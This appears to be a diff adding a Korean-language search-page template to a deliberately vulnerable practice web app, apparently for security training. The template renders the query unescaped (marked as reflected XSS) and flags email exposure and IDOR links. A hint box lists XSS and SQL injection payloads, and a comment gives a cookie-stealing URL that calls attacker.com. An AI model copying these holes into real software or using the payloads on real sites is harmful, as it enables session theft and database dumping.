@@ -1,0 +1,110 @@
+{% extends 'base.html' %}
+
+{% block title %}검색{% endblock %}
+
+{% block content %}
+<div class="page-container">
+    <div class="page-header">
+        <h1><i class="fas fa-search"></i> 회원 검색</h1>
+        <p>아이디 또는 이메일로 회원을 검색하세요</p>
+    </div>
+    
+    <div class="content-card">
+        <form action="{{ url_for('search') }}" method="GET" class="search-form-large">
+            <div class="search-input-group">
+                <input type="text" name="q" value="{{ query }}" 
+                       placeholder="검색어를 입력하세요..." class="search-input-large">
+                <button type="submit" class="btn btn-primary">
+                    <i class="fas fa-search"></i> 검색
+                </button>
+            </div>
+        </form>
+    </div>
+    
+    {% if query %}
+        <div class="content-card">
+            <h3>
+                <i class="fas fa-list"></i> 검색 결과
+                <!-- 취약점: Reflected XSS - query가 이스케이프 없이 출력됨 -->
+                <span class="search-query">"{{ query | safe }}"</span>
+            </h3>
+            
+            {% if results %}
+                <div class="table-responsive">
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>ID</th>
+                                <th>아이디</th>
+                                <th>이메일</th>
+                                <th>계정 유형</th>
+                                <th>액션</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            {% for user in results %}
+                                <tr>
+                                    <td>{{ user['id'] }}</td>
+                                    <td>{{ user['username'] }}</td>
+                                    <!-- 취약점: 이메일 정보 노출 -->
+                                    <td>{{ user['email'] }}</td>
+                                    <td>
+                                        {% if user['is_admin'] %}
+                                            <span class="badge badge-admin">관리자</span>
+                                        {% else %}
+                                            <span class="badge badge-user">일반</span>
+                                        {% endif %}
+                                    </td>
+                                    <td>
+                                        <!-- 취약점: IDOR 링크 -->
+                                        <a href="{{ url_for('account', user_id=user['id']) }}" 
+                                           class="btn btn-sm btn-secondary">
+                                            프로필 보기
+                                        </a>
+                                    </td>
+                                </tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+            {% else %}
+                <p class="no-data">검색 결과가 없습니다.</p>
+            {% endif %}
+        </div>
+    {% endif %}
+    
+    <!-- XSS 및 SQL Injection 테스트 힌트 -->
+    <div class="hint-box" style="margin-top: 20px; padding: 15px; background: #d1ecf1; border-radius: 8px; font-size: 12px;">
+        <p><strong>🧪 취약점 테스트:</strong></p>
+        <p><strong>XSS 테스트:</strong></p>
+        <ul style="margin-left: 20px;">
+            <li><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
+            <li><code>&lt;img src=x onerror=alert('XSS')&gt;</code></li>
+            <li><code>&lt;svg onload=alert('XSS')&gt;</code></li>
+        </ul>
+        <p style="margin-top: 10px;"><strong>SQL Injection 테스트:</strong></p>
+        <ul style="margin-left: 20px;">
+            <li><code>' OR '1'='1</code></li>
+            <li><code>' UNION SELECT 1,username,password,email,balance,is_admin,7,8 FROM users--</code></li>
+        </ul>
+    </div>
+</div>
+
+<!-- 
+XSS 공격 예시:
+/search?q=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
+
+SQL Injection 공격 예시:
+/search?q=' UNION SELECT 1,username,password,email,balance,is_admin,profile_pic,created_at FROM users--
+-->
+{% endblock %}
+
+
+
+
+
+
+
+
+
+
